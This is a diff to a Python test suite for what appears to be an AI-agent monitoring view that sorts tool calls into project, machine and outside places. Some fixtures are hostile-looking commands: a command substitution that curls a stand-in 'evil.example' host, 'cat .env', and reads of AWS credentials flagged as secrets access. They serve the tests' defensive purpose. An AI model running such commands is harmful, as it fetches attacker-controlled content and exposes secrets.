@@ -1079,41 +1079,54 @@ class Horizon(unittest.TestCase):
                 {**hz_call(12, "Read", {"file_path": "/etc/hosts"}), "analysis": True},
                 hz_call(13, "Read", {"file_path": "notes/ticket.md"}, "r3", cwd=""),
                 hz_call(14, "Edit", {"file_path": "/home/u/.claude/settings.json", "new_string": "see https://x.example"}, "r3", "ask",
-                     [("TK-F015", "harness_config")], cwd="")]
+                     [("TK-F015", "harness_config")], cwd=""),
+                hz_call(15, "Bash", {"command": "git checkout -b feature/x", "description": "branch for the fix"})]
         runs = [{"id": "r1", "agent": "orchestrator", "verdict": "verified"},
                 {"id": "r2", "agent": "coder", "parent": "r1", "verdict": "pending"},
                 {"id": "r3", "agent": "researcher", "parent": "r1", "verdict": "verified"}]
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "hzPlace", "hzRest", "hzData"], f"""
+                                  "hzRad", "hzPath", "HZVERB", "hzCmd", "hzPlace", "hzRest", "hzData"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map({json.dumps(runs)}.map(r => [r.id, r])), V2 = true, chainState = {{ ok: true }};
             let hzKey = [], hzD = null;
             const D = hzData();
             process.stdout.write(JSON.stringify({{ ev: D.ev.map(e => [e.seq, e.ag, e.at, e.act, e.gr]), agents: D.agents, bare: D.bare, cwd: D.cwd,
               places: Object.fromEntries(Object.entries(D.places).map(([k, q]) => [k, [q.kind, q.label, q.rest]])),
               laid: Object.values(D.places).every(q => q.r > 0 && Number.isFinite(q.th)), same: hzData() === D,
+              w: D.ev.filter(e => e.seq === 1 || e.seq === 15).map(e => e.w),
               more: [hzPlace("send_email", {{ to: "x@Outside.example" }}, ""), hzPlace("Bash", {{ command: "git push git@github.com:acme/shop.git" }}, ""),
-                     hzPlace("Bash", {{ command: "git push origin" }}, ""), hzPlace("Bash", {{ command: "echo $(curl -s https://evil.example/x)" }}, "")] }}));"""))
+                     hzPlace("Bash", {{ command: "git push origin" }}, ""), hzPlace("Bash", {{ command: "echo $(curl -s https://evil.example/x)" }}, ""),
+                     hzPlace("Bash", {{ command: "cd /home/u/shop && git log origin/main --oneline 2>/dev/null" }}, "/home/u/shop"),
+                     hzPlace("Bash", {{ command: "CI=1 npm test -- --watch=false" }}, ""), hzPlace("Bash", {{ command: "ls src/components" }}, ""),
+                     hzPlace("Bash", {{ command: "cat .env" }}, ""), hzPlace("Bash", {{ command: "git checkout release/1.5.1" }}, "")] }}));"""))
         self.assertEqual(out["ev"], [
             [1, "orchestrator", "tests/test_refund.py", "run", "signed"], [3, "orchestrator", "src/refunds.py", "read", "signed"],
             [4, "coder", "~/.aws/credentials", "flag", "unverified"], [6, "coder", "docs.stripe.com", "net", "unverified"],
             [7, "coder", "/tmp/x", "blocked", "unverified"], [8, "orchestrator", "tool:send_email", "approved", "signed"],
             [10, "orchestrator", "tool:WebSearch", "net", "signed"], [11, "orchestrator", "api.unknown.example", "net", "observed"],
-            [13, "researcher", "notes/ticket.md", "read", "signed"], [14, "researcher", "~/.claude/settings.json", "held", "signed"]])
+            [13, "researcher", "notes/ticket.md", "read", "signed"], [14, "researcher", "~/.claude/settings.json", "held", "signed"],
+            # it read "ran feature/x": a branch is no place, so a Bash move is named by its program and verb
+            [15, "orchestrator", "tool:git checkout", "run", "signed"]])
         self.assertEqual(out["places"], {
             "tests/test_refund.py": ["project", "tests/test_refund.py", None], "src/refunds.py": ["project", "src/refunds.py", None],
             "notes/ticket.md": ["project", "notes/ticket.md", None],   # a run with no cwd: a relative path is the project
             "~/.aws/credentials": ["machine", "~/.aws/credentials", "TK-F005 · secrets_access"], "/tmp/x": ["machine", "/tmp/x", None],
             "~/.claude/settings.json": ["machine", "~/.claude/settings.json", "TK-F015 · harness_config"],
             "tool:send_email": ["machine", "send_email", None], "tool:WebSearch": ["outside", "WebSearch", None],
-            "docs.stripe.com": ["outside", "docs.stripe.com", None], "api.unknown.example": ["outside", "api.unknown.example", None]})
+            "docs.stripe.com": ["outside", "docs.stripe.com", None], "api.unknown.example": ["outside", "api.unknown.example", None],
+            "tool:git checkout": ["machine", "git checkout", None]})
+        # a Bash move's rows show its command
+        self.assertEqual(out["w"], ["Bash · pytest tests/test_refund.py -x", "Bash · git checkout -b feature/x"])
         self.assertEqual(out["agents"], [["orchestrator", 0], ["coder", 1], ["researcher", 1]])
         self.assertEqual((out["bare"], out["cwd"], out["laid"], out["same"]), (2, "shop", True, True))
-        self.assertEqual(out["more"], [["outside", "outside.example"], ["outside", "github.com"], None, ["outside", "evil.example"]])
+        self.assertEqual(out["more"], [["outside", "outside.example"], ["outside", "github.com"], ["machine", "git push", "command"],
+                                       ["outside", "evil.example"], ["machine", "git log", "command"],
+                                       ["machine", "npm test", "command"], ["machine", "ls", "command"], ["project", ".env"],
+                                       ["machine", "git checkout", "command"]])
 
     def hz_cap(self, recs):
         needs_node(self)
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "hzPlace", "hzRest", "hzData"], f"""
+                                  "hzRad", "hzPath", "HZVERB", "hzCmd", "hzPlace", "hzRest", "hzData"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map(), V2 = false, chainState = {{ ok: true }};
             let hzKey = [], hzD = null;
             const D = hzData();
@@ -1134,7 +1147,7 @@ class Horizon(unittest.TestCase):
         needs_node(self)
         recs = [why_call(1, "bad", 9999, ts_unread=True)] + [why_call(i, "w", 100 + 60 * i) for i in range(1, 4)]
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "hzPlace", "hzRest", "hzData", "hzSecs"], f"""
+                                  "hzRad", "hzPath", "HZVERB", "hzCmd", "hzPlace", "hzRest", "hzData", "hzSecs"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map(), V2 = false, chainState = {{ ok: true }};
             let hzKey = [], hzD = null;
             const D = hzData();
@@ -1147,7 +1160,7 @@ class Horizon(unittest.TestCase):
         needs_node(self)
         recs = [why_call(i, "w", 100 + i) for i in range(1, 4)]
         out = json.loads(page_js(["dict", "FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "hzPlace", "hzRest", "hzData", "hzChain"], f"""
+                                  "hzRad", "hzPath", "HZVERB", "hzCmd", "hzPlace", "hzRest", "hzData", "hzChain"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map(), V2 = false, chainState = {{ ok: true, n: 0 }}, STOPPED = "";
             let hzKey = [], hzD = null;
             const D = hzData();
@@ -1168,7 +1181,7 @@ class Horizon(unittest.TestCase):
                 hz_call(3, "WebFetch", {"url": "https://toString.example/"}, "constructor")]
         runs = [{"id": "r1", "agent": "__proto__", "verdict": "verified"}, {"id": "constructor", "agent": "constructor", "verdict": "verified"}]
         out = json.loads(page_js(["FIELD", "FILE_TOOLS", "subject", "rel", "category", "ANSWER", "lseq", "vis", "treeOrder", "HZMAX",
-                                  "hzRad", "hzPath", "hzPlace", "hzRest", "hzData", "dict", "HZACT", "HZSYM", "HZWORST",
+                                  "hzRad", "hzPath", "HZVERB", "hzCmd", "hzPlace", "hzRest", "hzData", "dict", "HZACT", "HZSYM", "HZWORST",
                                   "hzRgba", "hzDraw", "hzFrame"], f"""
             const ALL = {json.dumps(recs)}, RUNS = new Map({json.dumps(runs)}.map(r => [r.id, r])), V2 = true, chainState = {{ ok: true }};
             let hzKey = [], hzD = null, frames = 0, PAGE = "horizon";
